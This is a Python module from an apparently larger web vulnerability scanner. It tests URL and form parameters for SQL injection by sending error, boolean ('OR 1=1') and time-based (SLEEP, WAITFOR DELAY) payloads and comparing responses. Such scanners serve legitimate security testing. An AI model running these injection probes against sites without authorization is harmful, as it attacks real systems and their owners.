"""
modules/sqli.py - SQL Injection Tester
Techniques: Error-based, Boolean-based, Time-based blind, Union-based
"""

import time
import urllib.parse
import re
from core.web_scanner import make_request
from config import SQLI_PAYLOADS, SQLI_ERRORS, Colors


def test_sqli_parameter(url: str, param: str, method: str = "GET", base_data: dict = None) -> dict:
    """Test a single parameter for SQL injection."""
    results = {
        "url": url,
        "parameter": param,
        "method": method,
        "vulnerabilities": [],
    }

    base_data = base_data or {}

    # Get baseline response
    baseline = make_request(url, method=method, data=base_data if method == "POST" else None)
    if not baseline:
        results["error"] = "Target unreachable"
        return results

    baseline_body = baseline.get("body", "")
    baseline_len = len(baseline_body)

    for payload in SQLI_PAYLOADS:
        test_data = {**base_data, param: payload}

        if method == "POST":
            resp = make_request(url, method="POST", data=test_data)
        else:
            # Build GET URL
            parsed = urllib.parse.urlparse(url)
            qparams = dict(urllib.parse.parse_qsl(parsed.query))
            qparams[param] = payload
            test_url = parsed._replace(query=urllib.parse.urlencode(qparams)).geturl()
            resp = make_request(test_url)

        if not resp:
            continue

        body = resp.get("body", "").lower()

        # 1. Error-based detection
        for error_sig in SQLI_ERRORS:
            if error_sig.lower() in body:
                results["vulnerabilities"].append({
                    "type": "Error-based SQLi",
                    "payload": payload,
                    "evidence": error_sig,
                    "severity": "HIGH",
                    "details": "Database error message exposed in response",
                })
                break

        # 2. Boolean-based (response length difference)
        true_payload = f"{payload}' OR '1'='1"
        false_payload = f"{payload}' AND '1'='2"

        if method == "POST":
            true_data = {**base_data, param: true_payload}
            false_data = {**base_data, param: false_payload}
            true_resp = make_request(url, method="POST", data=true_data)
            false_resp = make_request(url, method="POST", data=false_data)
        else:
            def build_url(pl):
                qp = dict(urllib.parse.parse_qsl(urllib.parse.urlparse(url).query))
                qp[param] = pl
                return urllib.parse.urlparse(url)._replace(
                    query=urllib.parse.urlencode(qp)
                ).geturl()
            true_resp = make_request(build_url(true_payload))
            false_resp = make_request(build_url(false_payload))

        if true_resp and false_resp:
            true_len = len(true_resp.get("body", ""))
            false_len = len(false_resp.get("body", ""))
            # Significant length difference = boolean-based sqli
            if abs(true_len - false_len) > 50 and true_len != baseline_len:
                results["vulnerabilities"].append({
                    "type": "Boolean-based Blind SQLi",
                    "payload": true_payload,
                    "evidence": f"Response length: TRUE={true_len} FALSE={false_len}",
                    "severity": "HIGH",
                    "details": "Page content differs based on boolean condition",
                })

        # 3. Time-based blind (for first payload only to save time)
        if payload in ("1' AND SLEEP(5)--", "1; WAITFOR DELAY '0:0:5'--"):
            start = time.time()
            if method == "POST":
                time_data = {**base_data, param: payload}
                make_request(url, method="POST", data=time_data, timeout=8)
            else:
                qp = dict(urllib.parse.parse_qsl(urllib.parse.urlparse(url).query))
                qp[param] = payload
                test_url = urllib.parse.urlparse(url)._replace(
                    query=urllib.parse.urlencode(qp)
                ).geturl()
                make_request(test_url, timeout=8)
            elapsed = time.time() - start

            if elapsed >= 4.5:
                results["vulnerabilities"].append({
                    "type": "Time-based Blind SQLi",
                    "payload": payload,
                    "evidence": f"Response delayed {elapsed:.2f}s",
                    "severity": "HIGH",
                    "details": "Server delayed response, indicating SQL SLEEP/WAITFOR executed",
                })

    return results


def scan_url_params(url: str) -> list:
    """Extract and test all GET parameters in a URL for SQLi."""
    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query))

    if not params:
        return []

    all_results = []
    for param in params:
        result = test_sqli_parameter(url, param, method="GET")
        if result.get("vulnerabilities"):
            all_results.append(result)

    return all_results


def scan_forms(url: str, forms: list) -> list:
    """Test all extracted form fields for SQLi."""
    all_results = []

    for form in forms:
        action = form["action"]
        method = form["method"]
        inputs = form["inputs"]

        # Only test text-type inputs
        text_inputs = [i for i in inputs if i["type"] not in ("submit", "button", "hidden", "file")]

        for inp in text_inputs:
            # Build base data (fill other fields with test values)
            base_data = {i["name"]: "test" for i in inputs}
            result = test_sqli_parameter(action, inp["name"], method=method, base_data=base_data)
            if result.get("vulnerabilities"):
                all_results.append(result)

    return all_results
